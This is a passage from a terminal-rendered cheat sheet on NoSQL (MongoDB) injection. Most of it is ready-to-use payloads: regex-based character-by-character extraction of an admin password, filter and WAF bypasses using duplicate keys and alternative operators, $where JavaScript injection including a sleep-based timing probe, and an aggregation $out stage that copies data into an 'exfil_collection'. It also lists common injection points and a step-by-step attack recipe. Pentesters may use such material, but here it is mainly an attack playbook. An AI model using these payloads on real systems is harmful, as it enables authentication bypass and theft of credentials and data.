[34m│[0m                                                                              [34m│[0m
[34m│[0m **GET parameters:**                                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ?username=admin&password[$regex]=^{EXTRACTED_SO_FAR}{NEXT_CHAR}              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### WAF and Filter Bypass                                                    [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Duplicate key override (last value wins in MongoDB):**                     [34m│[0m
[34m│[0m ```json                                                                      [34m│[0m
[34m│[0m {"id": "10", "id": {"$gt": ""}}                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m MongoDB uses the last occurrence of duplicate keys.                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Alternative operators when $ne is blocked:**                               [34m│[0m
[34m│[0m ```json                                                                      [34m│[0m
[34m│[0m {"password": {"$gt": ""}}                                                    [34m│[0m
[34m│[0m {"password": {"$regex": ".*"}}                                               [34m│[0m
[34m│[0m {"password": {"$exists": true}}                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Unicode/encoding variations:**                                             [34m│[0m
[34m│[0m Try URL-encoding operators or using alternative representations.             [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### $where JavaScript Injection                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m If $where operator is enabled (dangerous configuration):                     [34m│[0m
[34m│[0m ```json                                                                      [34m│[0m
[34m│[0m {"$where": "this.username == 'admin'"}                                       [34m│[0m
[34m│[0m {"$where": "sleep(5000)"}                                                    [34m│[0m
[34m│[0m {"$where": "this.password.match(/^a/)"}                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Aggregation Pipeline Injection                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m For MongoDB aggregation contexts:                                            [34m│[0m
[34m│[0m ```json                                                                      [34m│[0m
[34m│[0m {"$match": {"username": {"$ne": ""}}}                                        [34m│[0m
[34m│[0m [{"$match": {}}, {"$out": "exfil_collection"}]                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Common Injection Points                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m - Login forms (username/password fields)                                     [34m│[0m
[34m│[0m - Search functionality                                                       [34m│[0m
[34m│[0m - API endpoints accepting JSON                                               [34m│[0m
[34m│[0m - GraphQL resolvers                                                          [34m│[0m
[34m│[0m - User profile updates                                                       [34m│[0m
[34m│[0m - Password reset flows                                                       [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Building Blocks Approach                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m NoSQL INJECTION BUILDING BLOCKS:                                             [34m│[0m
[34m│[0m 1. Input format: URL-encoded vs JSON body                                    [34m│[0m
[34m│[0m 2. Operator: $ne, $gt, $regex, $where, $in, $nin                             [34m│[0m
[34m│[0m 3. Target field: username, password, email, id                               [34m│[0m
[34m│[0m 4. Extraction: boolean-based, regex character extraction                     [34m│[0m
[34m│[0m 5. Bypass: duplicate keys, alternative operators, encoding                   [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
